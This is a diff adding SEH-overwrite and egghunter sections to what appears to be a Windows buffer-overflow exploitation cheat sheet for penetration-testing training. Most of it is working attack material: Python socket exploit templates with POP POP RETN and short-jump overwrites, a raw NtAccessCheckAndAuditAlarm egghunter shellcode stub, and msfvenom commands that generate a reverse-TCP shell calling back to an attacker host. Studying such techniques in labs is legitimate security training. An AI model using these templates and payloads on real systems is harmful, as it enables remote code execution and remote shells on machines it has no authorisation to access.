@@ -184,3 +184,137 @@ python3 exploit.py
 - `EXITFUNC=thread` prevents the service from crashing after shell exits.
 - Always test the final exploit in Immunity first, then against the real target.
 - If `!mona jmp` returns nothing: try `!mona find -s "\xff\xe4" -type raw` or look in the application's own DLLs.
+
+---
+
+## SEH Exploitation
+
+Structured Exception Handling (SEH) overwrites differ from vanilla EIP overwrites. Used when the crash overwrites the SEH chain instead of EIP directly.
+
+### SEH chain layout on stack
+
+```
+[nSEH]  ← 4 bytes — next SEH record pointer (you control this)
+[SEH]   ← 4 bytes — exception handler address (you overwrite with POP POP RETN)
+```
+
+When an exception fires, Windows calls the handler at `[SEH]`. `POP POP RETN` unwinds two values from the stack (puts us at `nSEH`), then executes whatever is at `nSEH`. Put a short jump there to reach shellcode above the SEH record.
+
+### Workflow
+
+```bash
+# Step 1: crash the app, check if SEH chain is overwritten
+# In Immunity: View → SEH chain — does it show your pattern bytes?
+
+# Step 2: find exact SEH offset
+!mona findmsp -distance <crash_length>
+# Look for "SE handler" line — gives offset to SEH record
+
+# Step 3: find POP POP RETN gadget in a module WITHOUT SafeSEH/ASLR
+!mona seh -cpb "\x00\x0a"     # adds bad chars to filter
+# Pick an address from a module with: Rebase=False, SafeSEH=False, ASLR=False, NXCompat=False
+
+# Step 4: construct payload
+OFFSET_TO_NSEH = <offset_from_mona>
+NSEH = b"\xeb\x06\x90\x90"    # short jump +6 bytes to skip over SEH into shellcode
+SEH  = b"\xAD\x11\x50\x62"    # POP POP RETN — little endian
+```
+
+```python
+#!/usr/bin/env python3
+import socket
+
+IP = "<target>"
+PORT = <port>
+PREFIX = b""
+SUFFIX = b""
+OFFSET = <nseh_offset>
+NSEH = b"\xeb\x06\x90\x90"           # short JMP past SEH record
+SEH  = b"\xAD\x11\x50\x62"           # POP POP RETN — no SafeSEH module
+PADDING = b"\x90" * 16               # NOP sled after SEH for shellcode
+PAYLOAD = b""                         # msfvenom output here
+
+buf = PREFIX + b"A" * OFFSET + NSEH + SEH + PADDING + PAYLOAD + SUFFIX
+
+s = socket.socket()
+s.connect((IP, PORT))
+s.recv(1024)
+s.send(buf)
+```
+
+```bash
+# Generate shellcode (same as vanilla BOF — add all bad chars to -b)
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
+  EXITFUNC=thread -b "\x00\x0a" -f python -v PAYLOAD
+```
+
+> **SafeSEH bypass:** must find `POP POP RETN` in a DLL compiled without `/SAFESEH`. `!mona seh` filters these out by default. If no such module exists — use a heap spray or egghunter.
+
+---
+
+## Egghunter
+
+Use when shellcode space at the overflow point is too small (< ~300 bytes). A small 32-byte stub searches the entire virtual address space for your egg tag, then jumps to the full shellcode located elsewhere in memory.
+
+### Egg selection
+
+Pick a 4-byte tag that won't appear in your exploit buffer:
+```
+egg = b"w00t"    # common — must be unique and not in buf
+# Full search tag = egg repeated twice: b"w00tw00t"
+```
+
+### Generate egghunter stub
+
+```bash
+# In Immunity Debugger (mona)
+!mona egg -t w00t
+
+# Manual (NtAccessCheckAndAuditAlarm — 32 bytes, x86 Windows)
+```
+
+```python
+# Egghunter shellcode (NtAccessCheckAndAuditAlarm — reliable on XP/7/10)
+egghunter = (
+    b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+    b"\xef\xb8\x77\x30\x30\x74"   # 'w00t' as DWORD — change to match your egg
+    b"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+)
+```
+
+### Exploit structure
+
+```python
+#!/usr/bin/env python3
+import socket
+
+IP = "<target>"
+PORT = <port>
+
+EGG    = b"w00tw00t"       # 8 bytes — prepend to shellcode
+OFFSET = <eip_offset>
+RETN   = b"\xAF\x11\x50\x62"   # JMP ESP — same as vanilla BOF
+
+egghunter = (
+    b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+    b"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+)
+
+PAYLOAD = b""   # full shellcode — prepend EGG before it
+# msfvenom -p windows/shell_reverse_tcp ... -f python -v PAYLOAD
+
+# Full shellcode in buffer goes somewhere that fits (e.g. earlier in the request, different parameter)
+# Egghunter goes in the small space at EIP control point
+
+buf = b"A" * OFFSET + RETN + b"\x90" * 8 + egghunter
+shell_buf = EGG + PAYLOAD   # send this somewhere spacious in the same request/memory
+
+s = socket.socket()
+s.connect((IP, PORT))
+s.recv(1024)
+# Adjust based on protocol — ensure both buffers reach the process
+s.send(shell_buf)  # or send in a separate field/parameter
+s.send(buf)
+```
+
+> **Egg tag note:** the egg must be exactly 4 bytes, repeated twice in shellcode (`w00tw00t`). The DWORD in the egghunter stub (`\x77\x30\x30\x74` = `w00t` in little endian) must match your egg.
